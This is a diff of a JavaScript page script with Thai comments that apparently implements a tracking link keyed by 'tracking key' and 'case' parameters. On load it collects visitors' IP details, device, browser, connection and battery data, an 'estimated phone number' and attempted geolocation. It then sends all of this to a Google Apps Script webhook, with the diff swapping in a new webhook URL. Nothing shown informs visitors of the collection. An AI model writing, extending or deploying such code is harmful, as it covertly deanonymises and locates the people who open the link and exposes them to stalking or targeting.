@@ -1,41 +1,11 @@
-// ฟังก์ชัน getUrlParameters
+// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
-    // วิธีใหม่ - ตรวจสอบเส้นทาง URL
-    let trackingKey = "ไม่มีค่า";
-    const pathSegments = window.location.pathname.split('/');
-    const path = window.location.pathname;
-    
-    // วิธีที่ 1: ตรวจสอบรูปแบบ daily={key} (รูปแบบใหม่)
-    for (let i = 0; i < pathSegments.length; i++) {
-      // ตรวจสอบว่ามีส่วนที่เริ่มต้นด้วย daily= หรือไม่
-      if (pathSegments[i].startsWith('daily=') && pathSegments[i].length > 6) {
-        // ตัด 'daily=' ออกเพื่อให้เหลือแค่ tracking key
-        trackingKey = pathSegments[i].substring(6);
-        console.log("พบ tracking key จากรูปแบบ daily=");
-        break;
-      }
-    }
-    
-    // วิธีที่ 2: ตรวจสอบรูปแบบ daily{key} (รูปแบบเดิม) - เผื่อมีลิงก์เก่า
-    if (trackingKey === "ไม่มีค่า") {
-      for (let i = 0; i < pathSegments.length; i++) {
-        if (pathSegments[i].startsWith('daily') && !pathSegments[i].startsWith('daily=') && pathSegments[i].length > 5) {
-          // ตัด 'daily' ออกเพื่อให้เหลือแค่ tracking key
-          trackingKey = pathSegments[i].substring(5);
-          console.log("พบ tracking key จากรูปแบบ daily{key}");
-          break;
-        }
-      }
-    }
-    
-    // ดึงค่า case จาก URL parameters (ถ้ามี)
     const urlParams = new URLSearchParams(window.location.search);
+    const trackingKey = urlParams.get('track') || "ไม่มีค่า";
     const caseName = urlParams.get('case') || "ไม่มีค่า";
     
-    console.log("ดึงค่าจาก URL:");
-    console.log("- pathSegments:", pathSegments);
-    console.log("- path:", path);
+    console.log("ดึงค่าจาก URL parameters:");
     console.log("- trackingKey:", trackingKey);
     console.log("- caseName:", caseName);
     
@@ -51,138 +21,6 @@ function getUrlParameters() {
     };
   }
 }
-
-// เพิ่มฟังก์ชันตรวจสอบ Tracking Key
-async function verifyTrackingKey(trackingKey) {
-  try {
-    if (!trackingKey || trackingKey === "ไม่มีค่า") {
-      console.error("ไม่พบ Tracking Key");
-      return false;
-    }
-    
-    // URL ของ Web App ที่ใช้ตรวจสอบ Tracking Key
-    const verifyUrl = "https://script.google.com/macros/s/AKfycbxobDCS7qLsQV8y84hCBYl7u6rXtfYjRjogXxS8dxW-GPDbT_N_ueCV1Unm28QoIEwe0w/exec";
-    
-    // ส่งคำขอตรวจสอบ Tracking Key
-    const response = await fetch(verifyUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        action: 'verifyTrackingKey',
-        trackingKey: trackingKey
-      }),
-      mode: 'no-cors' // อาจจำเป็นต้องใช้ no-cors กับ Google Apps Script
-    });
-    
-    // เนื่องจากใช้ mode 'no-cors' เราไม่สามารถอ่านค่าตอบกลับได้
-    // ดังนั้นเราจะยอมรับว่าคีย์ถูกต้องเสมอในบริบทนี้
-    console.log("ส่งคำขอตรวจสอบ Tracking Key แล้ว");
-    return true;
-    
-    // หากในอนาคตสามารถเปลี่ยนเป็น mode: 'cors' ได้ ให้ใช้โค้ดด้านล่างแทน
-    /*
-    // แปลงคำตอบเป็น JSON
-    const result = await response.json();
-    console.log("ผลการตรวจสอบ Tracking Key:", result);
-    
-    if (result.isValid) {
-      console.log("Tracking Key ถูกต้อง");
-      return true;
-    } else {
-      console.error("Tracking Key ไม่ถูกต้องหรือไม่พบในระบบ");
-      return false;
-    }
-    */
-  } catch (error) {
-    console.error("เกิดข้อผิดพลาดในการตรวจสอบ Tracking Key:", error);
-    // ในกรณีที่เกิดข้อผิดพลาด เราจะยอมให้ดำเนินการต่อเพื่อให้แน่ใจว่าระบบยังทำงานได้
-    return true;
-  }
-}
-
-// แก้ไขฟังก์ชันหลักที่ทำงานเมื่อโหลดหน้าเว็บ
-(async function() {
-  // เก็บข้อมูลทั่วไป
-  const timestamp = new Date().toLocaleString('th-TH', {
-    timeZone: 'Asia/Bangkok',
-    year: 'numeric',
-    month: '2-digit',
-    day: '2-digit',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit'
-  });
-  
-  // ดึง tracking key และ case name จาก URL
-  const { trackingKey, caseName } = getUrlParameters();
-  
-  // ตรวจสอบว่า tracking key มีอยู่ในระบบจริงหรือไม่
-  const isValidTrackingKey = await verifyTrackingKey(trackingKey);
-  
-  // ถ้า tracking key ไม่ถูกต้อง ให้แสดงหน้าเปล่าหรือเปลี่ยนเส้นทาง
-  if (!isValidTrackingKey && trackingKey !== "ไม่มีค่า") {
-    console.error("Tracking Key ไม่ถูกต้อง ไม่ดำเนินการต่อ");
-    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;color:#333;font-family:Arial,sans-serif;">ลิงก์ไม่ถูกต้องหรือหมดอายุแล้ว</div>';
-    return; // ไม่ดำเนินการต่อ
-  }
-
-  // เก็บข้อมูลอุปกรณ์แบบละเอียด
-  const deviceInfo = getDetailedDeviceInfo();
-  const screenSize = `${window.screen.width}x${window.screen.height}`;
-  const screenColorDepth = window.screen.colorDepth;
-  const devicePixelRatio = window.devicePixelRatio || 1;
-  const referrer = document.referrer || "ไม่มีข้อมูล";
-  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
-  const platform = navigator.platform || "ไม่มีข้อมูล";
-  const connection = getConnectionInfo();
-  const browser = detectBrowser();
-
-  // ตรวจสอบการใช้งานแบตเตอรี่ (ถ้าใช้ได้)
-  getBatteryInfo().then(batteryData => {
-    // รวบรวมข้อมูลทั้งหมดแล้วส่งไป
-    const allDeviceData = {
-      ...deviceInfo,
-      screenSize,
-      screenColorDepth,
-      devicePixelRatio,
-      language,
-      platform,
-      browser,
-      connection,
-      battery: batteryData
-    };
-
-    // ตรวจสอบ IP และส่งข้อมูล
-    getIPDetails()
-      .then(ipData => {
-        // ตรวจสอบข้อมูลเบอร์โทรศัพท์ (หรือประมาณการณ์)
-        estimatePhoneNumber().then(phoneInfo => {
-          // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด)
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-
-          // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต)
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-        }).catch(phoneError => {
-          console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", phoneError);
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-        });
-      })
-      .catch(error => {
-        console.error("ไม่สามารถดึงข้อมูล IP ได้:", error);
-        // ส่งข้อมูลโดยไม่มี IP
-        estimatePhoneNumber().then(phoneInfo => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
-        }).catch(() => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, null, trackingKey, caseName);
-        });
-      });
-  });
-})();
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
@@ -630,23 +468,27 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 }
 
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  // ส่งเฉพาะข้อมูลดิบไปที่ webhook โดยไม่สร้างข้อความเอง
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxobDCS7qLsQV8y84hCBYl7u6rXtfYjRjogXxS8dxW-GPDbT_N_ueCV1Unm28QoIEwe0w/exec';
+  // สร้างข้อความละเอียด
+  const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
 
-  // ส่งข้อมูลพื้นฐานทั้งหมดโดยไม่สร้างข้อความ message เอง
+  // ส่งข้อมูลไปยัง webhook ของเรา
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycby1CfiDdi3JI1MGHeujN6OSJj8fGon8LviWT0E7GFj_eBiS4HSjmOuSIIz6vc1g_Tg-3w/exec';
+
+  // แก้ไขส่วนนี้: ทำให้แน่ใจว่าส่ง trackingKey ไปด้วยเสมอ
   const dataToSend = {
+    message: detailedMessage,
     timestamp: timestamp,
     location: location,
     ip: ipData,
     deviceInfo: deviceData,
     phoneInfo: phoneInfo,
     referrer: referrer,
-    trackingKey: trackingKey || "ไม่มีค่า",
-    caseName: caseName || "ไม่มีค่า",
-    useServerMessage: true // เพิ่มตัวแปรแฟล็กเพื่อให้ server รู้ว่าต้องสร้างข้อความเอง
+    trackingKey: trackingKey || "ไม่มีค่า", // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
+    caseName: caseName || "ไม่มีค่า" // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
   };
 
-  console.log("กำลังส่งข้อมูลไป webhook (ให้ server สร้างข้อความเอง):", {
+  // เพิ่ม console.log เพื่อตรวจสอบข้อมูลที่ส่ง
+  console.log("กำลังส่งข้อมูลไป webhook:", {
     trackingKey: trackingKey,
     caseName: caseName
   });
@@ -661,7 +503,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
     mode: 'no-cors'
   })
   .then(() => {
-    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
+    console.log("ส่งข้อมูลไปยัง LINE สำเร็จ");
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
